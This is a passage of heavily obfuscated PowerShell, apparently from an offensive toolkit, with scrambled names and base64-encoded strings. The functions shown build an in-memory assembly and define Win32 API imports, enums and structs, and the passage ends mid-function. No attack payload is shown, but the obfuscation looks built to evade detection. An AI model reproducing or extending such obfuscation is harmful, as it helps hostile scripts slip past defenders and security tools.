
function ____/=\_____/===== {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${_/=\__/\/\/==\/\/\} = [Guid]::NewGuid().ToString()
    )
    ${/=\__/=====\_/\__} = [Reflection.Assembly].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBBAHAAcABEAG8AbQBhAGkAbgA=')))).GetProperty($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgA=')))).GetValue($null, @())
    ${/=\/\_/==\/\____/} = ${/=\__/=====\_/\__}.GetAssemblies()
    foreach (${/=\/\_/\/\/\/\___} in ${/=\/\_/==\/\____/}) {
        if (${/=\/\_/\/\/\/\___}.FullName -and (${/=\/\_/\/\/\/\___}.FullName.Split(',')[0] -eq ${_/=\__/\/\/==\/\/\})) {
            return ${/=\/\_/\/\/\/\___}
        }
    }
    ${___/=\__/\_/\/\_/} = New-Object Reflection.AssemblyName(${_/=\__/\/\/==\/\/\})
    $Domain = ${/=\__/=====\_/\__}
    ${___/=\____/\__/\/} = $Domain.DefineDynamicAssembly(${___/=\__/\_/\/\_/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4A'))))
    ${___/==\/=\/\_____} = ${___/=\____/\__/\/}.DefineDynamicModule(${_/=\__/\/\/==\/\/\}, $False)
    return ${___/==\/=\/\_____}
}
function __/\_/\__/==\/=\_/ {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        ${___/=\_/===\_/\/\/},
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        ${_/==\/=\/==\__/=\_},
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        ${___/=\/=\/=\_/\/\/},
        [Parameter(Position = 3)]
        [Type[]]
        ${___/=\/=\__/==\/=\},
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        ${_/==\/\/\_/==\/=\/},
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        ${_/====\_/\_/\/=\/=},
        [String]
        ${__/=\__/\/=\__/\/=},
        [Switch]
        ${_/=\_/====\__/\_/=}
    )
    $Properties = @{
        DllName = ${___/=\_/===\_/\/\/}
        FunctionName = ${_/==\/=\/==\__/=\_}
        ReturnType = ${___/=\/=\/=\_/\/\/}
    }
    if (${___/=\/=\__/==\/=\}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAYQBtAGUAdABlAHIAVAB5AHAAZQBzAA==')))] = ${___/=\/=\__/==\/=\} }
    if (${_/==\/\/\_/==\/=\/}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUAQwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA==')))] = ${_/==\/\/\_/==\/=\/} }
    if (${_/====\_/\_/\/=\/=}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBzAGUAdAA=')))] = ${_/====\_/\_/\/=\/=} }
    if (${_/=\_/====\__/\_/=}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA')))] = ${_/=\_/====\__/\_/=} }
    if (${__/=\__/\/=\__/\/=}) { $Properties[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))] = ${__/=\__/\/=\__/\/=} }
    New-Object PSObject -Property $Properties
}
function __/\/===\/=\_/====
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        ${___/=\_/===\_/\/\/},
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        ${_/==\/=\/==\__/=\_},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        ${__/=\__/\/=\__/\/=},
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        ${___/=\/=\/=\_/\/\/},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        ${___/=\/=\__/==\/=\},
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        ${_/==\/\/\_/==\/=\/} = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        ${_/====\_/\_/\/=\/=} = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        ${_/=\_/====\__/\_/=},
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${_/===\/\/\_/\_/=\/},
        [ValidateNotNull()]
        [String]
        ${__/\/\__/=\____/\/} = ''
    )
    BEGIN
    {
        ${___/\/\_/\_____/=} = @{}
    }
    PROCESS
    {
        if (${_/===\/\/\_/\_/=\/} -is [Reflection.Assembly])
        {
            if (${__/\/\__/=\____/\/})
            {
                ${___/\/\_/\_____/=}[${___/=\_/===\_/\/\/}] = ${_/===\/\/\_/\_/=\/}.GetType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwALwBcAF8AXwAvAD0AXABfAF8AXwBfAC8AXAAvAH0ALgAkAHsAXwBfAF8ALwA9AFwAXwAvAD0APQA9AFwAXwAvAFwALwBcAC8AfQA='))))
            }
            else
            {
                ${___/\/\_/\_____/=}[${___/=\_/===\_/\/\/}] = ${_/===\/\/\_/\_/=\/}.GetType(${___/=\_/===\_/\/\/})
            }
        }
        else
        {
            if (!${___/\/\_/\_____/=}.ContainsKey(${___/=\_/===\_/\/\/}))
            {
                if (${__/\/\__/=\____/\/})
                {
                    ${___/\/\_/\_____/=}[${___/=\_/===\_/\/\/}] = ${_/===\/\/\_/\_/=\/}.DefineType($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwALwBcAF8AXwAvAD0AXABfAF8AXwBfAC8AXAAvAH0ALgAkAHsAXwBfAF8ALwA9AFwAXwAvAD0APQA9AFwAXwAvAFwALwBcAC8AfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
                else
                {
                    ${___/\/\_/\_____/=}[${___/=\_/===\_/\/\/}] = ${_/===\/\/\_/\_/=\/}.DefineType(${___/=\_/===\_/\/\/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA='))))
                }
            }
            $Method = ${___/\/\_/\_____/=}[${___/=\_/===\_/\/\/}].DefineMethod(
                ${_/==\/=\/==\__/=\_},
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAsAFAAaQBuAHYAbwBrAGUASQBtAHAAbAA='))),
                ${___/=\/=\/=\_/\/\/},
                ${___/=\/=\__/==\/=\})
            ${/==\__/===\__/\__} = 1
            foreach(${_/\/\__/\/=\__/==} in ${___/=\/=\__/==\/=\})
            {
                if (${_/\/\__/\/=\__/==}.IsByRef)
                {
                    [void] $Method.DefineParameter(${/==\__/===\__/\__}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB1AHQA'))), $null)
                }
                ${/==\__/===\__/\__}++
            }
            ${_/\/==\____/=\__/} = [Runtime.InteropServices.DllImportAttribute]
            ${_/=\___/=\/\_/\__} = ${_/\/==\____/=\__/}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQATABhAHMAdABFAHIAcgBvAHIA'))))
            ${/==\/=\____/====\} = ${_/\/==\____/=\__/}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBDAG8AbgB2AGUAbgB0AGkAbwBuAA=='))))
            ${________/\/=\/==\} = ${_/\/==\____/=\__/}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBTAGUAdAA='))))
            ${/=\__/\/=\____/=\} = ${_/\/==\____/=\__/}.GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA='))))
            if (${_/=\_/====\__/\_/=}) { ${_/\/\_____/===\/\} = $True } else { ${_/\/\_____/===\/\} = $False }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAcgB5AFAAbwBpAG4AdAA=')))]) { ${___/=\/\__/====\_} = ${__/=\__/\/=\__/\/=} } else { ${___/=\/\__/====\_} = ${_/==\/=\/==\__/=\_} }
            ${_/==\_/\_/\_/==\/} = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            ${/=\_______/==\/=\} = New-Object Reflection.Emit.CustomAttributeBuilder(${_/==\_/\_/\_/==\/},
                ${___/=\_/===\_/\/\/}, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @(${_/=\___/=\/\_/\__},
                                           ${/==\/=\____/====\},
                                           ${________/\/=\/==\},
                                           ${/=\__/\/=\____/=\}),
                [Object[]] @(${_/\/\_____/===\/\},
                             ([Runtime.InteropServices.CallingConvention] ${_/==\/\/\_/==\/=\/}),
                             ([Runtime.InteropServices.CharSet] ${_/====\_/\_/\/=\/=}),
                             ${___/=\/\__/====\_}))
            $Method.SetCustomAttribute(${/=\_______/==\/=\})
        }
    }
    END
    {
        if (${_/===\/\/\_/\_/=\/} -is [Reflection.Assembly])
        {
            return ${___/\/\_/\_____/=}
        }
        ${_/=\/=\_/=\/==\_/} = @{}
        foreach (${/=\___/\_/\/=\/==} in ${___/\/\_/\_____/=}.Keys)
        {
            ${_/=\/\/\_/\/\/\__/} = ${___/\/\_/\_____/=}[${/=\___/\_/\/=\/==}].CreateType()
            ${_/=\/=\_/=\/==\_/}[${/=\___/\_/\/=\/==}] = ${_/=\/\/\_/\/\/\__/}
        }
        return ${_/=\/=\_/=\/==\_/}
    }
}
function ____/==\__/\/\/\/\ {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${_/===\/\/\_/\_/=\/},
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${___/\________/\/=\},
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        ${_/=\/\/\_/\/\/\__/},
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${_/=\/===\____/\_/=},
        [Switch]
        ${__/=\/\_/=\/=\_/==}
    )
    if (${_/===\/\/\_/\_/=\/} -is [Reflection.Assembly])
    {
        return (${_/===\/\/\_/\_/=\/}.GetType(${___/\________/\/=\}))
    }
    ${___/\__/\_/\/\/==} = ${_/=\/\/\_/\/\/\__/} -as [Type]
    ${__/==\/\____/=\_/} = ${_/===\/\/\_/\_/=\/}.DefineEnum(${___/\________/\/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), ${___/\__/\_/\/\/==})
    if (${__/=\/\_/=\/=\_/==})
    {
        ${/=\/\/\__/\/=\/==} = [FlagsAttribute].GetConstructor(@())
        ${__/====\/====\__/} = New-Object Reflection.Emit.CustomAttributeBuilder(${/=\/\/\__/\/=\/==}, @())
        ${__/==\/\____/=\_/}.SetCustomAttribute(${__/====\/====\__/})
    }
    foreach (${/=\___/\_/\/=\/==} in ${_/=\/===\____/\_/=}.Keys)
    {
        $null = ${__/==\/\____/=\_/}.DefineLiteral(${/=\___/\_/\/=\/==}, ${_/=\/===\____/\_/=}[${/=\___/\_/\/=\/==}] -as ${___/\__/\_/\/\/==})
    }
    ${__/==\/\____/=\_/}.CreateType()
}
function __/\____/=\____/\/ {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        ${__/\/=\__/\_/=\/==},
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        ${_/=\/\/\_/\/\/\__/},
        [Parameter(Position = 2)]
        [UInt16]
        ${__/===\/=\/\__/\/=},
        [Object[]]
        ${__/=\_/===\_/\/==\}
    )
    @{
        Position = ${__/\/=\__/\_/=\/==}
        Type = ${_/=\/\/\_/\/\/\__/} -as [Type]
        Offset = ${__/===\/=\/\__/\/=}
        MarshalAs = ${__/=\_/===\_/\/==\}
    }
}
function ____/=\__/===\_/\_
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        ${_/===\/\/\_/\_/=\/},
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        ${___/\________/\/=\},
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        ${_/=\_/\__/==\_/\/=},
        [Reflection.Emit.PackingSize]
        ${_/=\/===\_/\_/\_/\} = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        ${_/==\_/\____/=\/==}
    )
    if (${_/===\/\/\_/\_/=\/} -is [Reflection.Assembly])
    {
        return (${_/===\/\/\_/\_/=\/}.GetType(${___/\________/\/=\}))
    }
    [Reflection.TypeAttributes] ${___/=\_____/=\/\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAHMAaQBDAGwAYQBzAHMALAANAAoAIAAgACAAIAAgACAAIAAgAEMAbABhAHMAcwAsAA0ACgAgACAAIAAgACAAIAAgACAAUAB1AGIAbABpAGMALAANAAoAIAAgACAAIAAgACAAIAAgAFMAZQBhAGwAZQBkACwADQAKACAAIAAgACAAIAAgACAAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
    if (${_/==\_/\____/=\/==})
    {
        ${___/=\_____/=\/\_} = ${___/=\_____/=\/\_} -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        ${___/=\_____/=\/\_} = ${___/=\_____/=\/\_} -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    ${___/\____/===\___} = ${_/===\/\/\_/\_/=\/}.DefineType(${___/\________/\/=\}, ${___/=\_____/=\/\_}, [ValueType], ${_/=\/===\_/\_/\_/\})
    ${__/=\/\/===\/\/=\} = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    ${______/\____/==\/} = @([Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
    ${___/=\/\/\/=\/===} = New-Object Hashtable[](${_/=\_/\__/==\_/\/=}.Count)
    foreach (${_/\_/\__/\_/\/=\/} in ${_/=\_/\__/==\_/\/=}.Keys)
    {
        ${/==\/\/\/=\/\/\/\} = ${_/=\_/\__/==\_/\/=}[${_/\_/\__/\_/\/=\/}][$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHMAaQB0AGkAbwBuAA==')))]
        ${___/=\/\/\/=\/===}[${/==\/\/\/=\/\/\/\}] = @{FieldName = ${_/\_/\__/\_/\/=\/}; Properties = ${_/=\_/\__/==\_/\/=}[${_/\_/\__/\_/\/=\/}]}
    }
    foreach (${_/\_/\__/\_/\/=\/} in ${___/=\/\/\/=\/===})
    {
        ${__/==\_/=\___/===} = ${_/\_/\__/\_/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGUAbABkAE4AYQBtAGUA')))]
        ${/==\/=\___/=\/===} = ${_/\_/\__/\_/\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]
        ${__/===\/=\/\__/\/=} = ${/==\/=\___/=\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBmAGYAcwBlAHQA')))]
        ${_/=\/\/\_/\/\/\__/} = ${/==\/=\___/=\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAB5AHAAZQA=')))]
        ${__/=\_/===\_/\/==\} = ${/==\/=\___/=\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHIAcwBoAGEAbABBAHMA')))]
        ${___/\/\___/=\/===} = ${___/\____/===\___}.DefineField(${__/==\_/=\___/===}, ${_/=\/\/\_/\/\/\__/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))
        if (${__/=\_/===\_/\/==\})
        {
            ${___/=\___/=\_/==\} = ${__/=\_/===\_/\/==\}[0] -as ([Runtime.InteropServices.UnmanagedType])
            if (${__/=\_/===\_/\/==\}[1])
            {
                ${__/==\_/===\/\_/=} = ${__/=\_/===\_/\/==\}[1]
                ${__/=\___/==\/===\} = New-Object Reflection.Emit.CustomAttributeBuilder(${__/=\/\/===\/\/=\},
                    ${___/=\___/=\_/==\}, ${______/\____/==\/}, @(${__/==\_/===\/\_/=}))
            }
            else
            {
                ${__/=\___/==\/===\} = New-Object Reflection.Emit.CustomAttributeBuilder(${__/=\/\/===\/\/=\}, [Object[]] @(${___/=\___/=\_/==\}))
            }
            ${___/\/\___/=\/===}.SetCustomAttribute(${__/=\___/==\/===\})
        }
        if (${_/==\_/\____/=\/==}) { ${___/\/\___/=\/===}.SetOffset(${__/===\/=\/\__/\/=}) }
    }
    ${/===\/=\/\/=\_/\_} = ${___/\____/===\___}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUwBpAHoAZQA='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjAA=='))),
        [Int],
        [Type[]] @())
    ${____/=\_/\/===\__} = ${/===\/=\/\/=\_/\_}.GetILGenerator()
    ${____/=\_/\/===\__}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${___/\____/===\___})
    ${____/=\_/\/===\__}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${____/=\_/\/===\__}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYA'))), [Type[]] @([Type])))
    ${____/=\_/\/===\__}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${_/=\/=\/\/\/\_/\/} = ${___/\____/===\___}.DefineMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAF8ASQBtAHAAbABpAGMAaQB0AA=='))),
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBhAHQAZQBTAGMAbwBwAGUALAAgAFAAdQBiAGwAaQBjACwAIABTAHQAYQB0AGkAYwAsACAASABpAGQAZQBCAHkAUwBpAGcALAAgAFMAcABlAGMAaQBhAGwATgBhAG0AZQA='))),
        ${___/\____/===\___},
        [Type[]] @([IntPtr]))
    ${/==\_/=\___/==\/=} = ${_/=\/=\/\/\/\_/\/}.GetILGenerator()
    ${/==\_/=\___/==\/=}.Emit([Reflection.Emit.OpCodes]::Nop)
    ${/==\_/=\___/==\/=}.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    ${/==\_/=\___/==\/=}.Emit([Reflection.Emit.OpCodes]::Ldtoken, ${___/\____/===\___})
    ${/==\_/=\___/==\/=}.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAVAB5AHAAZQBGAHIAbwBtAEgAYQBuAGQAbABlAA==')))))
    ${/==\_/=\___/==\/=}.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB0AHIAVABvAFMAdAByAHUAYwB0AHUAcgBlAA=='))), [Type[]] @([IntPtr], [Type])))
    ${/==\_/=\___/==\/=}.Emit([Reflection.Emit.OpCodes]::Unbox_Any, ${___/\____/===\___})
    ${/==\_/=\___/==\/=}.Emit([Reflection.Emit.OpCodes]::Ret)
    ${___/\____/===\___}.CreateType()
}
Function _/=\/==\/\_/\__/== {
    [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
    Param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$Name,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [System.Type]${_/=\/\/\_/\/\/\__/} = [int],
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string[]]${_/\___/==\/=\/\/=},
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$Mandatory,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [int]${__/\/=\__/\_/=\/==},
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$HelpMessage,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$DontShow,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipeline,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromPipelineByPropertyName,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValueFromRemainingArguments,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [string]$ParameterSetName = '__AllParameterSets',
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowNull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyString,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$AllowEmptyCollection,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNull,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [switch]$ValidateNotNullOrEmpty,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateCount,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateRange,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateCount(2,2)]
        [int[]]$ValidateLength,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string]$ValidatePattern,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [scriptblock]$ValidateScript,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [string[]]$ValidateSet,
        [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
            {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQAgAG0AdQBzAHQAIABiAGUAIABhACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFIAdQBuAHQAaQBtAGUARABlAGYAaQBuAGUAZABQAGEAcgBhAG0AZQB0AGUAcgBEAGkAYwB0AGkAbwBuAGEAcgB5ACAAbwBiAGoAZQBjAHQA')))
            }
            $true
        })]
        $Dictionary = $false,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [switch]$CreateVariables,
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true, ParameterSetName = 'CreateVariables')]
        [ValidateNotNullOrEmpty()]
        [ValidateScript({
            if($_.GetType().Name -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGMAdABpAG8AbgBhAHIAeQA=')))) {
                Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMAIABtAHUAcwB0ACAAYgBlACAAYQAgAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBQAFMAQgBvAHUAbgBkAFAAYQByAGEAbQBlAHQAZQByAHMARABpAGMAdABpAG8AbgBhAHIAeQAgAG8AYgBqAGUAYwB0AA==')))
            }
            $true
        })]
        $BoundParameters
    )
    Begin {
        ${__/\_/\/========\} = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
        function _temp { [CmdletBinding()] Param() }
        ${/=\/\/\/=====\_/=} = (gcm _temp).Parameters.Keys
    }
    Process {
        if($CreateVariables) {
            ${/=\__/\_/===\_/=\} = $BoundParameters.Keys | ? { ${/=\/\/\/=====\_/=} -notcontains $_ }
            ForEach(${_/\/\__/\/=\__/==} in ${/=\__/\_/===\_/=\}) {
                if (${_/\/\__/\/=\__/==}) {
                    sv -Name ${_/\/\__/\/=\__/==} -Value $BoundParameters.${_/\/\__/\/=\__/==} -Scope 1 -Force
                }
            }
        }
        else {
            ${_/==\_/\_/\/\/\_/} = @()
            ${_/==\_/\_/\/\/\_/} = $PSBoundParameters.GetEnumerator() |
                        % {
                            if($_.Value.PSobject.Methods.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBFAHEAdQBhAGwAcwAkAA==')))) {
                                if(!$_.Value.Equals((gv -Name $_.Key -ValueOnly -Scope 0))) {
                                    $_.Key
                                }
                            }
                            else {
                                if($_.Value -ne (gv -Name $_.Key -ValueOnly -Scope 0)) {
                                    $_.Key
                                }
                            }
                        }
            if(${_/==\_/\_/\/\/\_/}) {
                ${_/==\_/\_/\/\/\_/} | % {[void]$PSBoundParameters.Remove($_)}
            }
            ${_/\/==\_/========} = (gcm -Name ($PSCmdlet.MyInvocation.InvocationName)).Parameters.GetEnumerator()  |
                                        ? { $_.Value.ParameterSets.Keys -contains $PsCmdlet.ParameterSetName } |
                                            select -ExpandProperty Key |
                                                ? { $PSBoundParameters.Keys -notcontains $_ }
            ${__/\/\/=\/\__/\_/} = $null
            ForEach (${_/\/\__/\/=\__/==} in ${_/\/==\_/========}) {
                ${_/=\___/\/=\___/\} = gv -Name ${_/\/\__/\/=\__/==} -ValueOnly -Scope 0
                if(!$PSBoundParameters.TryGetValue(${_/\/\__/\/=\__/==}, [ref]${__/\/\/=\/\__/\_/}) -and ${_/=\___/\/=\___/\}) {
                    $PSBoundParameters.${_/\/\__/\/=\__/==} = ${_/=\___/\/=\___/\}
                }
            }
            if($Dictionary) {
                ${__/\_/====\/====\} = $Dictionary
            }
            else {
                ${__/\_/====\/====\} = ${__/\_/\/========\}
            }
            ${_/\__/\/\_/\/==\_} = {gv -Name $_ -ValueOnly -Scope 0}
            ${__/\_/\_/\/=\/===} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAE0AYQBuAGQAYQB0AG8AcgB5AHwAUABvAHMAaQB0AGkAbwBuAHwAUABhAHIAYQBtAGUAdABlAHIAUwBlAHQATgBhAG0AZQB8AEQAbwBuAHQAUwBoAG8AdwB8AEgAZQBsAHAATQBlAHMAcwBhAGcAZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQB8AFYAYQBsAHUAZQBGAHIAbwBtAFAAaQBwAGUAbABpAG4AZQBCAHkAUAByAG8AcABlAHIAdAB5AE4AYQBtAGUAfABWAGEAbAB1AGUARgByAG8AbQBSAGUAbQBhAGkAbgBpAG4AZwBBAHIAZwB1AG0AZQBuAHQAcwApACQA')))
